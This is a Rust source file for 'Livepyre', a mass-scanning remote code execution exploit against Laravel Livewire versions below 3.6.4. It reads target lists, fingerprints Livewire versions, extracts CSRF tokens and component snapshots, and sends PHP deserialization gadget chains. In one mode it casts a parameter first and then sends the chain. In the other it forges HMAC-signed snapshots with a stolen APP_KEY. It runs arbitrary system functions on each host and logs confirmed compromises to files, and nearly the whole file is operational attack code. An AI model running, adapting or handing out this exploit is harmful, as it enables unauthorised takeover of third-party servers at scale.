/*
 * Livepyre — Laravel Livewire RCE Exploit (Rust)
 * Converted from Python Livepyre tool
 * Mass-scan version with Shodan IP list support
 *
 * Two exploit modes:
 *   - Without APP_KEY: stage1 (cast param) → stage2 (gadget chain RCE)
 *   - With APP_KEY: HMAC-sign a poisoned snapshot with embedded gadget chain
 *
 * Attack chain targets Livewire < v3.6.4 snapshot deserialization
 */

use colored::*;
use regex::Regex;
use reqwest::header::{CONTENT_TYPE, USER_AGENT};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::io::{self, BufRead, BufReader, Write};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::Duration;

use crate::common::{build_client_pool, pick_client, random_user_agent, save_content};

// ─── Constants ───────────────────────────────────────────────────────────────

const DEFAULT_THREADS: usize = 10;
const DEFAULT_FUNCTION: &str = "system";
const DEFAULT_PARAM: &str = "id";
const BATCH_SIZE: usize = 5_000;

// ─── Livewire version hashes (from versions.json) ───────────────────────────

fn load_version_map() -> HashMap<&'static str, &'static str> {
    let mut m = HashMap::new();
    m.insert("v3.0.0", "af0b760a");
    m.insert("v3.0.0-beta.1", "3605227a");
    m.insert("v3.0.1", "11c49d7e");
    m.insert("v3.0.10", "2f6e5d4d");
    m.insert("v3.0.2", "51f84ddf");
    m.insert("v3.0.3", "75fdc007");
    m.insert("v3.0.4", "28cda9ab");
    m.insert("v3.0.5", "f41737f6");
    m.insert("v3.0.6", "5d3e67e0");
    m.insert("v3.0.7", "5d3e67e0");
    m.insert("v3.0.8", "178de384");
    m.insert("v3.0.9", "2f6e5d4d");
    m.insert("v3.1.0", "c4077c56");
    m.insert("v3.2.0", "d38cabc2");
    m.insert("v3.2.1", "2b77c128");
    m.insert("v3.2.2", "eaa5c323");
    m.insert("v3.2.3", "8afc12b0");
    m.insert("v3.2.4", "29c31048");
    m.insert("v3.2.5", "8a579aa1");
    m.insert("v3.2.6", "f477dd12");
    m.insert("v3.3.0", "8a199ab2");
    m.insert("v3.3.1", "f121a5df");
    m.insert("v3.3.2", "f121a5df");
    m.insert("v3.3.3", "f121a5df");
    m.insert("v3.3.4", "6c8cb814");
    m.insert("v3.3.5", "e2b302e9");
    m.insert("v3.4.0", "b713ce84");
    m.insert("v3.4.1", "5eee0fac");
    m.insert("v3.4.10", "239a5c52");
    m.insert("v3.4.11", "44144c23");
    m.insert("v3.4.12", "770f7738");
    m.insert("v3.4.2", "8ed4c109");
    m.insert("v3.4.3", "94b2c3e6");
    m.insert("v3.4.4", "a27c4ca2");
    m.insert("v3.4.5", "6b5eb707");
    m.insert("v3.4.6", "6b5eb707");
    m.insert("v3.4.7", "d02a3788");
    m.insert("v3.4.8", "4495682f");
    m.insert("v3.4.9", "5d8beb2e");
    m.insert("v3.5.0", "07f22875");
    m.insert("v3.5.1", "87e1046f");
    m.insert("v3.5.10", "ec3a716b");
    m.insert("v3.5.11", "36c381f7");
    m.insert("v3.5.12", "38dc8241");
    m.insert("v3.5.13", "4ce12f49");
    m.insert("v3.5.14", "0f65591d");
    m.insert("v3.5.15", "def850b5");
    m.insert("v3.5.16", "da3bb356");
    m.insert("v3.5.17", "02b08710");
    m.insert("v3.5.18", "951e6947");
    m.insert("v3.5.19", "13b7c601");
    m.insert("v3.5.2", "c4fc8c5d");
    m.insert("v3.5.20", "13b7c601");
    m.insert("v3.5.3", "7bfaddcd");
    m.insert("v3.5.4", "cc800bf4");
    m.insert("v3.5.5", "cc800bf4");
    m.insert("v3.5.6", "cc800bf4");
    m.insert("v3.5.7", "923613aa");
    m.insert("v3.5.8", "923613aa");
    m.insert("v3.5.9", "923613aa");
    m.insert("v3.6.0", "65f3e655");
    m.insert("v3.6.1", "65f3e655");
    m.insert("v3.6.2", "fcf8c2ad");
    m.insert("v3.6.3", "df3a17f2");
    // v3.6.4+ patched
    m.insert("v3.6.4", "df3a17f2");
    m.insert("v3.7.0", "f084fdfb");
    m.insert("v3.7.1", "646f9d24");
    m.insert("v3.7.2", "a1f2ce31");
    m.insert("v3.7.3", "0f6341c0");
    m
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn normalize_url(raw: &str) -> String {
    let trimmed = raw.trim();
    if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
        trimmed.trim_end_matches('/').to_string()
    } else {
        format!("http://{}", trimmed.trim_end_matches('/'))
    }
}

fn get_base_url(url: &str) -> String {
    if let Ok(parsed) = url::Url::parse(url) {
        let port_str = parsed
            .port()
            .map(|p| format!(":{}", p))
            .unwrap_or_default();
        format!(
            "{}://{}{}",
            parsed.scheme(),
            parsed.host_str().unwrap_or(""),
            port_str
        )
    } else {
        url.to_string()
    }
}

// ─── Extract CSRF token ─────────────────────────────────────────────────────

fn get_csrf_token(html: &str) -> Option<String> {
    // data-csrf="..."
    if let Some(pos) = html.find("data-csrf=\"") {
        let rest = &html[pos + 11..];
        if let Some(end) = rest.find('"') {
            return Some(rest[..end].to_string());
        }
    }

    // livewireScriptConfig
    if let Some(pos) = html.find("livewireScriptConfig = ") {
        let rest = &html[pos + 23..];
        if let Some(end) = rest.find(';') {
            if let Ok(config) = serde_json::from_str::<Value>(&rest[..end]) {
                if let Some(csrf) = config.get("csrf").and_then(|v| v.as_str()) {
                    return Some(csrf.to_string());
                }
            }
        }
    }

    // csrf-token meta
    if let Some(pos) = html.find("csrf-token\" content=\"") {
        let rest = &html[pos + 20..];
        if let Some(end) = rest.find('"') {
            return Some(rest[..end].to_string());
        }
    }

    None
}

// ─── Extract update URI ─────────────────────────────────────────────────────

fn get_update_uri(html: &str, base_url: &str) -> Option<String> {
    // livewireScriptConfig
    if let Some(pos) = html.find("livewireScriptConfig = ") {
        let rest = &html[pos + 23..];
        if let Some(end) = rest.find(';') {
            if let Ok(config) = serde_json::from_str::<Value>(&rest[..end]) {
                if let Some(uri) = config.get("uri").and_then(|v| v.as_str()) {
                    let uri = uri.trim_start_matches('/');
                    return Some(format!("{}/{}", base_url, uri));
                }
            }
        }
    }

    // data-update-uri="..."
    if let Some(pos) = html.find("data-update-uri=\"") {
        let rest = &html[pos + 17..];
        if let Some(end) = rest.find('"') {
            let uri = &rest[..end];
            if uri.starts_with("http://") || uri.starts_with("https://") {
                return Some(uri.to_string());
            } else {
                let uri = uri.trim_start_matches('/');
                return Some(format!("{}/{}", base_url, uri));
            }
        }
    }

    None
}

// ─── Extract snapshots ──────────────────────────────────────────────────────

fn extract_snapshots(html: &str) -> Vec<String> {
    let re = Regex::new(r#"wire:snapshot="([^"]*)"#).unwrap();
    re.captures_iter(html)
        .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string()))
        .collect()
}

// ─── HTML unescape ──────────────────────────────────────────────────────────

fn html_unescape(s: &str) -> String {
    s.replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#039;", "'")
        .replace("&#39;", "'")
        .replace("&apos;", "'")
}

// ─── Build the gadget chain string ──────────────────────────────────────────

fn build_gadget_chain(function: &str, param: &str) -> String {
    format!(
        "O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":4:{{s:5:\"dummy\";O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{{s:9:\"\x00*\x00events\";O:31:\"Illuminate\\Validation\\Validator\":1:{{s:10:\"extensions\";a:1:{{s:0:\"\";s:{}:\"{}\";}}}}s:8:\"\x00*\x00event\";s:{}:\"{}\";}}s:10:\"connection\";N;s:5:\"queue\";N;s:5:\"event\";O:37:\"Illuminate\\Notifications\\Notification\":0:{{}}}}",
        function.len(), function, param.len(), param
    )
}

// ─── Build stage2 payload (without APP_KEY) ─────────────────────────────────

fn build_stage2_payload(
    token: &str,
    snapshot: &str,
    param_name: &str,
    function: &str,
    param: &str,
) -> Value {
    let chain = build_gadget_chain(function, param);

    json!({
        "_token": token,
        "components": [{
            "snapshot": snapshot,
            "updates": {
                param_name: [
                    1,
                    [
                        {
                            "a": [{
                                "__toString": "phpversion",
                                "close": [
                                    [
                                        [
                                            {"chained": [chain]},
                                            {"s": "form", "class": "Illuminate\\Broadcasting\\BroadcastEvent"}
                                        ],
                                        "dispatchNextJobInChain"
                                    ],
                                    {"s": "clctn", "class": "Laravel\\SerializableClosure\\Serializers\\Signed"}
                                ]
                            },
                            {"s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream"}],
                            "b": [{
                                "__toString": [
                                    [[null, {"s": "mdl", "class": "Laravel\\Prompts\\Terminal"}], "exit"],
                                    {"s": "clctn", "class": "Laravel\\SerializableClosure\\Serializers\\Signed"}
                                ]
                            },
                            {"s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream"}]
                        },
                        {"class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator", "s": "clctn"}
                    ]
                ]
            },
            "calls": []
        }]
    })
}

// ─── Build APP_KEY payload (with HMAC) ──────────────────────────────────────

fn build_appkey_payload(
    token: &str,
    snapshot_json: &mut Value,
    function: &str,
    param: &str,
    app_key: &str,
) -> Option<Value> {
    let data = snapshot_json.get_mut("data")?.as_object_mut()?;
    if data.is_empty() {
        return None;
    }

    let first_key = data.keys().next()?.to_string();
    let chain = build_gadget_chain(function, param);

    // Build the poisoned data value
    let poisoned = json!([{
        "a": [{
            "__toString": "phpversion",
            "close": [
                [[{"chained": [chain]}, {"s": "form", "class": "Illuminate\\Broadcasting\\BroadcastEvent"}], "dispatchNextJobInChain"],
                {"s": "clctn", "class": "Laravel\\SerializableClosure\\Serializers\\Signed"}
            ]
        },
        {"s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream"}],
        "b": [{
            "__toString": [
                [[null, {"s": "mdl", "class": "Laravel\\Prompts\\Terminal"}], "exit"],
                {"s": "clctn", "class": "Laravel\\SerializableClosure\\Serializers\\Signed"}
            ]
        },
        {"s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream"}]
    },
    {"class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator", "s": "clctn"}]);

    data.insert(first_key, poisoned);

    // Remove existing checksum before computing new one
    snapshot_json.as_object_mut()?.remove("checksum");

    // Compute HMAC-SHA256 checksum
    // PHP json_encode replaces / with \/ — replicate that
    let snapshot_str = serde_json::to_string(snapshot_json)
        .ok()?
        .replace('/', "\\/");

    let key_bytes = parse_app_key(app_key);
    let checksum = compute_hmac_sha256(&key_bytes, snapshot_str.as_bytes());

    snapshot_json
        .as_object_mut()?
        .insert("checksum".to_string(), json!(checksum));

    let signed_snapshot = serde_json::to_string(snapshot_json)
        .ok()?
        .replace('/', "\\/");

    Some(json!({
        "_token": token,
        "components": [{
            "snapshot": signed_snapshot,
            "updates": {},
            "calls": []
        }]
    }))
}

// ─── Parse Laravel APP_KEY ──────────────────────────────────────────────────

fn parse_app_key(key: &str) -> Vec<u8> {
    use base64::Engine;
    if let Some(b64) = key.strip_prefix("base64:") {
        base64::engine::general_purpose::STANDARD
            .decode(b64)
            .unwrap_or_else(|_| key.as_bytes().to_vec())
    } else if key.len() == 44 {
        base64::engine::general_purpose::STANDARD
            .decode(key)
            .unwrap_or_else(|_| key.as_bytes().to_vec())
    } else {
        key.as_bytes().to_vec()
    }
}

// ─── HMAC-SHA256 ────────────────────────────────────────────────────────────

fn compute_hmac_sha256(key: &[u8], data: &[u8]) -> String {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    type HmacSha256 = Hmac<Sha256>;
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key error");
    mac.update(data);
    let result = mac.finalize();
    hex::encode(result.into_bytes())
}

// ─── Check if snapshot param has object type ────────────────────────────────

fn check_array_param(data: &Value) -> Option<String> {
    let obj = data.as_object()?;
    let strict = ["str", "std", "int", "float", "mdl"];

    for (param, value) in obj {
        if let Some(arr) = value.as_array() {
            for entry in arr {
                if let Some(s) = entry.get("s").and_then(|v| v.as_str()) {
                    if !strict.contains(&s) {
                        return Some(param.clone());
                    }
                }
            }
        }
    }
    None
}

// ─── Check Livewire version vulnerability ───────────────────────────────────

fn check_version_vulnerable(html: &str) -> (bool, Option<String>) {
    let html_lower = html.to_lowercase();
    let versions = load_version_map();

    for (version, hash) in &versions {
        if html_lower.contains(hash) {
            let ver_num = version.replace('v', "");
            if ver_num.as_str() < "3.6.4" && *version != "v3.6.3" {
                return (true, Some(version.to_string()));
            } else {
                return (false, Some(version.to_string()));
            }
        }
    }
    // Unknown version — try anyway
    (true, None)
}

// ─── Exploit without APP_KEY ────────────────────────────────────────────────

async fn exploit_without_appkey(
    client: &reqwest::Client,
    base_url: &str,
    html: &str,
    function: &str,
    param: &str,
    ua: &str,
) -> bool {
    let token = match get_csrf_token(html) {
        Some(t) => t,
        None => return false,
    };

    let update_url = match get_update_uri(html, base_url) {
        Some(u) => u,
        None => return false,
    };

    let snapshots = extract_snapshots(html);
    if snapshots.is_empty() {
        return false;
    }

    for raw_snapshot in &snapshots {
        let unescaped = html_unescape(raw_snapshot);
        let snapshot_val: Value = match serde_json::from_str(&unescaped) {
            Ok(v) => v,
            Err(_) => continue,
        };

        let data = match snapshot_val.get("data") {
            Some(d) if d.is_object() && !d.as_object().unwrap().is_empty() => d,
            _ => continue,
        };

        // Check for object-typed param first (avoids bruteforce)
        if let Some(obj_param) = check_array_param(data) {
            let snapshot_str = serde_json::to_string(&snapshot_val).unwrap_or_default();
            let payload = build_stage2_payload(&token, &snapshot_str, &obj_param, function, param);

            if let Ok(resp) = client
                .post(&update_url)
                .header(CONTENT_TYPE, "application/json")
                .header(USER_AGENT, ua)
                .json(&payload)
                .timeout(Duration::from_secs(15))
                .send()
                .await
            {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                if status == 200 && !body.contains("\"snapshot\"") {
                    return true;
                }
            }
        }

        // Bruteforce all params: stage1 (cast) → stage2 (exploit)
        let data_obj = data.as_object().unwrap();
        for param_name in data_obj.keys() {
            // Stage 1: cast param to array
            let stage1_payload = json!({
                "_token": &token,
                "components": [{
                    "snapshot": serde_json::to_string(&snapshot_val).unwrap_or_default(),
                    "updates": { param_name: [] },
                    "calls": []
                }]
            });

            let stage1_resp = match client
                .post(&update_url)
                .header(CONTENT_TYPE, "application/json")
                .header(USER_AGENT, ua)
                .json(&stage1_payload)
                .timeout(Duration::from_secs(15))
                .send()
                .await
            {
                Ok(r) => r,
                Err(_) => continue,
            };

            let stage1_body: Value = match stage1_resp.json().await {
                Ok(v) => v,
                Err(_) => continue,
            };

            // Extract new snapshot from stage1 response
            let new_snapshot = match stage1_body
                .pointer("/components/0/snapshot")
                .and_then(|v| v.as_str())
            {
                Some(s) => s.to_string(),
                None => continue,
            };

            // Stage 2: send gadget chain
            let stage2_payload =
                build_stage2_payload(&token, &new_snapshot, param_name, function, param);

            if let Ok(resp) = client
                .post(&update_url)
                .header(CONTENT_TYPE, "application/json")
                .header(USER_AGENT, ua)
                .json(&stage2_payload)
                .timeout(Duration::from_secs(15))
                .send()
                .await
            {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                if status == 200 && !body.contains("\"snapshot\"") {
                    return true;
                }
            }
        }
    }

    false
}

// ─── Exploit with APP_KEY ───────────────────────────────────────────────────

async fn exploit_with_appkey(
    client: &reqwest::Client,
    base_url: &str,
    html: &str,
    function: &str,
    param: &str,
    app_key: &str,
    ua: &str,
) -> bool {
    let token = match get_csrf_token(html) {
        Some(t) => t,
        None => return false,
    };

    let update_url = match get_update_uri(html, base_url) {
        Some(u) => u,
        None => return false,
    };

    let snapshots = extract_snapshots(html);
    if snapshots.is_empty() {
        return false;
    }

    for raw_snapshot in &snapshots {
        let unescaped = html_unescape(raw_snapshot);
        let mut snapshot_val: Value = match serde_json::from_str(&unescaped) {
            Ok(v) => v,
            Err(_) => continue,
        };

        if snapshot_val
            .get("data")
            .and_then(|d| d.as_object())
            .map(|o| o.is_empty())
            .unwrap_or(true)
        {
            continue;
        }

        // Remove existing checksum
        snapshot_val.as_object_mut().map(|o| o.remove("checksum"));

        let payload = match build_appkey_payload(
            &token,
            &mut snapshot_val,
            function,
            param,
            app_key,
        ) {
            Some(p) => p,
            None => continue,
        };

        if let Ok(resp) = client
            .post(&update_url)
            .header(CONTENT_TYPE, "application/json")
            .header(USER_AGENT, ua)
            .json(&payload)
            .timeout(Duration::from_secs(15))
            .send()
            .await
        {
            let status = resp.status().as_u16();
            if status == 200 {
                let body = resp.text().await.unwrap_or_default();
                if !body.contains("\"snapshot\"") {
                    return true;
                }
            }
        }
    }

    false
}

// ─── Process single target ──────────────────────────────────────────────────

async fn process_target(
    client: reqwest::Client,
    raw_url: String,
    function: String,
    param: String,
    app_key: Option<String>,
    user_agents: Arc<Vec<String>>,
    processed: Arc<AtomicU64>,
    total: u64,
) {
    let base_url = normalize_url(&raw_url);
    let base = get_base_url(&base_url);
    let ua = random_user_agent(&user_agents);
    let current = processed.fetch_add(1, Ordering::Relaxed) + 1;

    // Fetch page
    let html = match client
        .get(&base_url)
        .header(USER_AGENT, &ua)
        .timeout(Duration::from_secs(10))
        .send()
        .await
    {
        Ok(resp) => resp.text().await.unwrap_or_default(),
        Err(e) => {
            let msg = if e.is_timeout() {
                "Timeout"
            } else if e.is_connect() {
                "Connection Error"
            } else {
                "Error"
            };
            println!(
                "[{}/{}] [{}] {} => {}",
                current,
                total,
                "-".red(),
                base_url,
                msg.red()
            );
            return;
        }
    };

    // Check Livewire presence
    if !html.to_lowercase().contains("livewire") {
        println!(
            "[{}/{}] [{}] {} => {}",
            current,
            total,
            "-".yellow(),
            base_url,
            "No Livewire".yellow()
        );
        return;
    }

    // Check version
    let (vulnerable, detected_ver) = check_version_vulnerable(&html);
    let ver_str = detected_ver
        .as_deref()
        .unwrap_or("unknown");

    if !vulnerable {
        println!(
            "[{}/{}] [{}] {} => {} ({})",
            current,
            total,
            "-".yellow(),
            base_url,
            "Patched".yellow(),
            ver_str
        );
        return;
    }

    // Check snapshots
    if !html.to_lowercase().contains("wire:snapshot") {
        println!(
            "[{}/{}] [{}] {} => {}",
            current,
            total,
            "-".yellow(),
            base_url,
            "No snapshots".yellow()
        );
        save_content("livepyre_livewire.txt", &format!("{} | {} | no_snapshots", base_url, ver_str)).await;
        return;
    }

    println!(
        "[{}/{}] [{}] {} => {} ({})",
        current,
        total,
        "*".cyan(),
        base_url,
        "Livewire found, exploiting...".cyan(),
        ver_str
    );

    let success = if let Some(ref key) = app_key {
        exploit_with_appkey(&client, &base, &html, &function, &param, key, &ua).await
    } else {
        exploit_without_appkey(&client, &base, &html, &function, &param, &ua).await
    };

    if success {
        println!(
            "[{}/{}] [{}] {} => {} ({})",
            current,
            total,
            "!".green().bold(),
            base_url,
            "RCE CONFIRMED".green().bold(),
            ver_str
        );
        save_content(
            "livepyre_rce.txt",
            &format!("{} | {} | RCE", base_url, ver_str),
        )
        .await;
    } else {
        println!(
            "[{}/{}] [{}] {} => {} ({})",
            current,
            total,
            "-".red(),
            base_url,
            "Exploit failed".red(),
            ver_str
        );
    }

    save_content("livepyre_targets.txt", &format!("{} | {}", base_url, ver_str)).await;
}

// ─── Process batch ──────────────────────────────────────────────────────────

async fn process_batch(
    batch: Vec<String>,
    thread_count: usize,
    function: &str,
    param: &str,
    app_key: &Option<String>,
    user_agents: &Arc<Vec<String>>,
    processed: &Arc<AtomicU64>,
    total: u64,
    client_pool: &[reqwest::Client],
) {
    let semaphore = Arc::new(Semaphore::new(thread_count));
    let function = Arc::new(function.to_string());
    let param = Arc::new(param.to_string());
    let app_key = Arc::new(app_key.clone());

    let mut handles = Vec::with_capacity(batch.len());

    for (i, url) in batch.into_iter().enumerate() {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let client = pick_client(client_pool, i);
        let func = function.clone();
        let par = param.clone();
        let ak = app_key.clone();
        let uas = user_agents.clone();
        let proc_clone = processed.clone();

        let handle = tokio::spawn(async move {
            process_target(
                client,
                url,
                (*func).clone(),
                (*par).clone(),
                (*ak).clone(),
                uas,
                proc_clone,
                total,
            )
            .await;
            drop(permit);
        });
        handles.push(handle);
    }

    for h in handles {
        let _ = h.await;
    }
}

// ─── Count lines ────────────────────────────────────────────────────────────

fn count_lines(path: &str) -> u64 {
    let file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return 0,
    };
    BufReader::new(file).lines().count() as u64
}

// ─── Public Entry Point ─────────────────────────────────────────────────────

pub async fn run(user_agents: Arc<Vec<String>>) {
    println!(
        "{} | {}",
        "LIVEPYRE".yellow(),
        "Livewire RCE Exploit".yellow()
    );
    println!();

    let stdin = io::stdin();

    print!("- Target List (txt) : ");
    io::stdout().flush().unwrap();
    let mut list_path = String::new();
    stdin.lock().read_line(&mut list_path).unwrap();
    let list_path = list_path.trim().to_string();

    print!("- Function [default: {}] : ", DEFAULT_FUNCTION);
    io::stdout().flush().unwrap();
    let mut func_input = String::new();
    stdin.lock().read_line(&mut func_input).unwrap();
    let function = if func_input.trim().is_empty() {
        DEFAULT_FUNCTION.to_string()
    } else {
        func_input.trim().to_string()
    };

    print!("- Param [default: {}] : ", DEFAULT_PARAM);
    io::stdout().flush().unwrap();
    let mut param_input = String::new();
    stdin.lock().read_line(&mut param_input).unwrap();
    let param = if param_input.trim().is_empty() {
        DEFAULT_PARAM.to_string()
    } else {
        param_input.trim().to_string()
    };

    print!("- APP_KEY (optional, leave empty for without-key mode) : ");
    io::stdout().flush().unwrap();
    let mut appkey_input = String::new();
    stdin.lock().read_line(&mut appkey_input).unwrap();
    let app_key: Option<String> = if appkey_input.trim().is_empty() {
        None
    } else {
        Some(appkey_input.trim().to_string())
    };

    if app_key.is_some() {
        eprintln!("{}", "[*] Mode: With APP_KEY (HMAC-signed snapshots)".green());
    } else {
        eprintln!(
            "{}",
            "[*] Mode: Without APP_KEY (stage1 cast + stage2 gadget chain)".green()
        );
    }

    print!("- Thread [default: {}] : ", DEFAULT_THREADS);
    io::stdout().flush().unwrap();
    let mut thread_input = String::new();
    stdin.lock().read_line(&mut thread_input).unwrap();
    let thread_count: usize = thread_input.trim().parse().unwrap_or(DEFAULT_THREADS);

    print!("- Batch size [default: {}] : ", BATCH_SIZE);
    io::stdout().flush().unwrap();
    let mut batch_input = String::new();
    stdin.lock().read_line(&mut batch_input).unwrap();
    let batch_size: usize = batch_input.trim().parse().unwrap_or(BATCH_SIZE);

    // Build client pool
    let pool_size = thread_count.min(200);
    let client_pool = build_client_pool(pool_size);

    // Count total lines
    eprint!("{}", "[*] Counting targets... ".cyan());
    let total_lines = count_lines(&list_path);
    eprintln!("{}", format!("{} targets found", total_lines).green());

    if total_lines == 0 {
        eprintln!("{}", "No targets found in file.".red());
        return;
    }

    // Open file for streaming
    let file = match std::fs::File::open(&list_path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("{}", format!("Failed to read target file: {}", e).red());
            return;
        }
    };

    let reader = BufReader::with_capacity(8 * 1024 * 1024, file);

    eprintln!(
        "{}",
        format!(
            "[*] Streaming: batch_size={}, threads={}, function='{}', param='{}'",
            batch_size, thread_count, function, param
        )
        .green()
    );

    let processed = Arc::new(AtomicU64::new(0));
    let mut batch: Vec<String> = Vec::with_capacity(batch_size);
    let mut batch_num: u64 = 0;

    for line in reader.lines() {
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };

        let trimmed = line.trim().to_string();
        if trimmed.is_empty() {
            continue;
        }

        batch.push(trimmed);

        if batch.len() >= batch_size {
            batch_num += 1;
            eprintln!(
                "{}",
                format!(
                    "[*] Processing batch #{} ({} targets)...",
                    batch_num,
                    batch.len()
                )
                .cyan()
            );

            process_batch(
                std::mem::take(&mut batch),
                thread_count,
                &function,
                &param,
                &app_key,
                &user_agents,
                &processed,
                total_lines,
                &client_pool,
            )
            .await;

            batch = Vec::with_capacity(batch_size);
        }
    }

    // Process remaining
    if !batch.is_empty() {
        batch_num += 1;
        eprintln!(
            "{}",
            format!(
                "[*] Processing batch #{} ({} targets)...",
                batch_num,
                batch.len()
            )
            .cyan()
        );

        process_batch(
            batch,
            thread_count,
            &function,
            &param,
            &app_key,
            &user_agents,
            &processed,
            total_lines,
            &client_pool,
        )
        .await;
    }

    eprintln!(
        "\n{}",
        "[*] Done. Results saved to livepyre_rce.txt / livepyre_targets.txt / livepyre_livewire.txt"
            .green()
    );
}
